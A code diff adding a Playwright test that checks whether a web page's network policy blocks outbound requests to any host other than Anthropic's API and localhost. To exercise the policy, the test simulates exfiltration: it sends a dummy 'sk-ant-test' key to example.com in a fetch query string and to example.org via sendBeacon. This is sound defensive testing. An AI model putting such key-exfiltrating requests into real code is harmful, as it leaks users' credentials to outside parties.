@@ -42,3 +42,29 @@ test.describe("English", () => {
     expect(errors).toEqual([]);
   });
 });
+
+test("the network policy blocks requests to any address except Anthropic and localhost", async ({ page }) => {
+  await page.goto("/");
+  const result = await page.evaluate(async () => {
+    const violations: string[] = [];
+    document.addEventListener("securitypolicyviolation", (e) => violations.push(e.blockedURI));
+    const tryFetch = (url: string) => fetch(url, { mode: "no-cors" }).then(() => "sent", () => "failed");
+    const outside = await tryFetch("https://example.com/?key=sk-ant-test");
+    navigator.sendBeacon("https://example.org/collect", "sk-ant-test"); // queued, then blocked
+    await new Promise((r) => setTimeout(r, 300));
+    return { outside, violations };
+  });
+  expect(result.outside).toBe("failed");
+  expect(result.violations.some((u) => u.includes("example.com"))).toBe(true);
+  expect(result.violations.some((u) => u.includes("example.org"))).toBe(true);
+  // Allowed destinations are not reported as violations.
+  const allowed = await page.evaluate(async () => {
+    const violations: string[] = [];
+    document.addEventListener("securitypolicyviolation", (e) => violations.push(e.blockedURI));
+    await fetch("https://api.anthropic.com/v1/models", { mode: "no-cors" }).catch(() => {});
+    await fetch("http://localhost:11434/api/tags", { mode: "no-cors" }).catch(() => {});
+    await new Promise((r) => setTimeout(r, 200));
+    return violations;
+  });
+  expect(allowed).toEqual([]);
+});
